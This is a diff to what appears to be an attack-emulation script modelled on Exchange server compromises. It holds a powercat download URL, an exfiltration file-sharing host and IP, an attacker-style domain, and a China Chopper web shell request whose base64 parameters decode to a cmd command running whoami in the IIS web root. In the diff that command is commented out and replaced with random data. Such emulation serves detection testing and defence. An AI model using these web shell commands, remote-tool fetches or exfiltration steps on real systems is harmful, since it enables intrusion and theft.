@@ -17,10 +17,17 @@ $victim-port = "32232"
 
 $powercat = "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
 
-$file_sharing_domain = "mego.io"
+$file_sharing_domain = "mega.io"
 $file_sharing_ip = "89.44.169.139"
 
 $agent-id = uuid.v4(" ")
+
+
+$domain = "brian.krebsonsecurity.top"
+
+action dns {
+    exec DNSConnection
+}
 
 # Exchange Servers are controlled by China Chopper programmed in JScript
 # POST requests to the .aspx script executing code with JScript 'eval' function
@@ -130,13 +137,13 @@ action megaxfer {
 sleep 100
 
 repeat 100 as $index {
-    $data = base64.encode(random.string(128))
+    $data = base64url.encode(random.string(random.int(42,82)))
     
     action http {
 	$method = "POST"
-	$domain = "brian.krebsonsecurity.top"
 	$client-content = $data
-	$uri = "/healthcheck.aspx&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D"
+	# $uri = "/healthcheck.aspx&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D"
+	$uri = "/healthcheck.aspx&z1=Y21k&z2=${data}%3D%3D"
 	
 	exec HTTPConnection
     }
